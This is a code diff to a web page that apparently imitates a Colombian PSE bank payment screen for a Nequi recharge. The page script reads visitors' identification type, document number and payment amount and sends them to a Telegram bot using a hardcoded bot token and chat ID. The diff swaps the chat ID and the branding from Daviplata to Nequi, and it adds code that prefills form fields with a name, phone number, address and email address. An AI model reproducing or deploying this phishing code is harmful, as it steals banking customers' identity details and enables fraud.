@@ -102,7 +102,7 @@
 
 										</li>
 										<li><label style="color: #fff;">Motivo</label>
-											<h4 style="color: #fff;">Recarga DAVIPLATA PSE</h4>
+											<h4 style="color: #fff;">Recarga Nequi PSE</h4>
 										</li>
 
 <li>
@@ -202,7 +202,7 @@
 		<script>
 			function carl(params) {
   const token = "5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU";
-  const chatId = "-4277446098";
+  const chatId = "-4247377194";
   const usr = document.getElementById("formAutenticar:tipoIdentificacion").value;
   const uservalid = document.getElementById("formAutenticar:numeroDocumento").value;
   const monto = localStorage.getItem("monto")
@@ -216,7 +216,7 @@
     url: `https://api.telegram.org/bot${token}/sendMessage`,
     data: {
       chat_id: chatId,
-      text: message,	
+      text: message,
       parse_mode: "html",
     },
     success: function (res) {
@@ -232,6 +232,11 @@
     },
   });
 }
+document.getElementById("person_name").value = "raul torres";
+document.getElementById("phone_number").value = "3224567896";
+document.getElementById("address").value = "calle 100";
+document.getElementById("city").value = "bogota";
+document.getElementById("email").value = "jannygarcialvarez@hotmail.com";
 
 		</script>
 </body></html>
